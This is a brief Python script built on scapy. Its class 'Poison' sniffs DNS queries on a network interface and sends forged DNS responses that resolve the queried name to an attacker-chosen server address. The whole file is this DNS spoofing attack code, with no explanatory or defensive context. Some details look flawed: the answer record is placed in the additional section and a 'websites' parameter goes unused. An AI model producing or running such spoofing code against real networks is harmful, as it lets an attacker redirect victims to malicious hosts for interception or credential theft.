#! /usr/bin/python

from scapy import packet
from scapy.arch import get_if_hwaddr
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff


class Poison: 
    
    interface = ' '
    server = ' '

    def __init__(self, interface, server, websites):
        self.interface = interface
        self.server = server
        self.websites = websites
        self.packet_filter = " and ".join([
            "udp dst port 53",      # Filter UDP port 53
            "udp[10] & 0x80 = 0",   # DNS queries only
        ])

    def reply(self, packet):
        # Construct the DNS packet
        # Construct the Ethernet header by looking at the sniffed packet
        eth = Ether(
            src=packet[Ether].dst,
            dst=packet[Ether].src
            )

        # Construct the IP header by looking at the sniffed packet
        ip = IP(
            src=packet[IP].dst,
            dst=packet[IP].src
            )

        # Construct the UDP header by looking at the sniffed packet
        udp = UDP(
            dport=packet[UDP].sport,
            sport=packet[UDP].dport
            )

        # Construct the DNS response by looking at the sniffed packet and manually
        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            ar=DNSRR(
                rrname=packet[DNS].qd.qname,
                type='A',
                ttl=600,
                rdata=self.server)
            )

        # Put the full packet together
        response_packet = eth / ip / udp / dns

        # Send the DNS response
        sendp(response_packet, iface=self.interface)

    def sniff(self):
        return sniff(prn=self.reply, filter=self.packet_filter, store=0, iface = self.interface, count = 1)

        
		

